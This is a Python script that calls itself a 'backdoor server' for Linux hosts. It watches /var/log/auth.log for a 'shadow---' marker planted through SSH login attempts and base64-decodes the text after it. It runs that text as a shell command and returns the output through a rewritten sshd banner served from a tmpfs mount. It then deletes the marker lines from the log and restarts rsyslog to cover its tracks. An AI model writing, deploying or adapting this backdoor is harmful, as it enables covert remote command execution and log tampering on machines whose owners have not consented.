#auth.log watcher backdoor server

import base64
import time
import binascii
import subprocess


ipcheck = "1.1.1.1"
# counter keeps track of whether or not the previous stdout changes should be cleaned up
counter = 0
while True:
    for line in open("/var/log/auth.log"):
        try:
            # if it is not the first connection. Should implement cleanup when script is quit
            #if "shadow---" in line and counter > 0:
            #    print(counter)
            #    subprocess.call("rm", "-rf", "/tmp/tmpfs/*")
            #    subprocess.call("umount", "/tmp/tmpfs/")
            #    subprocess.check_output("sed -i 's:Banner /tmp/tmpfs/issue.net:Banner none:g'", shell=True)
            #    subprocess.check_output("systemctl restart sshd, shell=True")

            if "shadow---" in line:
                print(counter)
                a,b = line.split("---")
                array1 = b.split("from")
                presortip = array1[1]
                iplist = presortip.split(" ")
                ip = iplist[1]
                base64string = array1[0]
                str(base64string)
                str(ip)
                ip = ip.replace(" ", "")
                base64string = base64string.replace(" ", "")
                try:
                    base64.decodestring(base64string)
                    decodedcmd = base64.b64decode(base64string)
                    cmd = subprocess.check_output(decodedcmd, shell=True);
                    print(cmd + "THIS IS WHEN IT'S FIRST EXECUTED")
                except binascii.Error:
                    pass
                # after the command is sent, create tmp filesystem
                try: 
                    subprocess.check_output("mkdir /tmp/tmpfs", shell=True)
                    print("created dir for tmpfs")
                except subprocess.CalledProcessError as e:
                    pass
                time.sleep(1)
                subprocess.check_output("mount -t tmpfs -o size=64m tmpfs /tmp/tmpfs", shell=True)
                print("mounted tmpfs")
                # create new file in tmpfs and write command
                tmpIssue = open("/tmp/tmpfs/issue.net", 'w') 
                print("opened issue.net")
                time.sleep(2)
                tmpIssue.write(cmd)
                tmpIssue.close()
                print("wrote to issue.net the output")
                time.sleep(2)
                # modify sshd_config and restart sshd to apply changes
                subprocess.check_output("sed -i 's:#Banner none:Banner /tmp/tmpfs/issue.net:g' /etc/ssh/sshd_config", shell=True)
                print("rewrote sshd_config")
                time.sleep(2)
                subprocess.call("systemctl restart sshd", shell=True)
                print("restarting sshd")
                time.sleep(10)
                # cleanup. Further connections will show the output until command reset
                subprocess.call("rm -rf /tmp/tmpfs/*", shell=True)
                subprocess.call("umount /tmp/tmpfs/", shell=True)

                



        except IndexError:
            pass
    if "shadow---" in line:
        subprocess.check_output("sed -i '/.shadow---./d' /var/log/auth.log", shell=True);
        subprocess.check_output("/etc/init.d/rsyslog restart", shell=True);
        subprocess.check_output("systemctl restart sshd, shell=True")
        #restart syslog cuz for soem reason it crashes on debian after txt manipulation, temp fix untill better solution is found.
    time.sleep(1)
